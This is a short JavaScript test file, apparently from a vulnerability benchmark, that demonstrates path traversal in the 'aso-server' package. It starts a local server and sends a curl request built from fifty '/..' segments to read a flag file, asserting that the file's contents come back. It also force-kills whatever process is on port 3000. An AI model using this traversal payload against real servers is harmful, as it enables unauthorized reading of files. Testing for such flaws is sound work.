const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");
function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}
test("Path Traversal in aso-server", (done) => {
  expect.assertions(1);
  var pkg = require('aso-server')
  const fs = require("fs");
  const { sleep } = require("sleep");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 3000/tcp", () => {});
  } catch (e) {}
  let server = pkg
     .onError(e => console.log(e))
     .onStop(() => {})
     .start('localhost', 3000, srv => {});
  sleep(2);
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:3000/f/${genstr()}"`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});